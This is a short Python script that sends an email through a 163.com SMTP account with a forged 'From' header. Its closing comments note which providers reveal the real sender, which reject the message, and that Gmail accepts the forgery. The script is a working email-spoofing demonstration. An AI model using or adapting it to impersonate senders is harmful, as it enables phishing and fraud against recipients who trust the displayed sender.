#!/usr/bin/env python3
# -*- coding:utf-8 -*-
###
# File: mail_.py
# Created Date: Monday, May 18th 2020, 3:37:50 pm
# Author: Hypdncy
# -----
# Last Modified:
# Modified By:
# -----
# Copyright (c) 2020 Hypdncy
#
# 佛祖保佑，永无BUG
# -----
# HISTORY:
# Date      	By	Comments
# ----------	---	----------------------------------------------------------
###
import smtplib
from email.header import Header
from email.mime.text import MIMEText

################真实信息################
# 发送邮箱服务器
smtpserver = 'smtp.163.com'
# 发送邮箱用户/密码
real_sender = 'hypdncy@163.com'
real_password = 'password'

# 接收邮箱
real_receiver = 'hypdncy@gmail.com'
# 发送邮件主题
subject = 'Python email forgery'

################构造信息################
# 编写HTML类型的邮件正文，可选HTML等改变格式
msg = MIMEText('This is a forgery email !')
msg['Subject'] = Header(subject, 'utf-8')
msg['To'] = Header(real_receiver)

# 伪造部分
forgery_sender = "admin@163.com"
msg['From'] = Header(forgery_sender)

# 连接发送邮件
smtp = smtplib.SMTP()
smtp.connect(smtpserver)
smtp.login(real_sender, real_password)
smtp.sendmail(real_sender, real_receiver, msg.as_string())
smtp.quit()

# 网易邮箱和QQ邮箱都会显示是谁代发
# outlook会直接拒收
# gmail会发送成功，并且成功伪造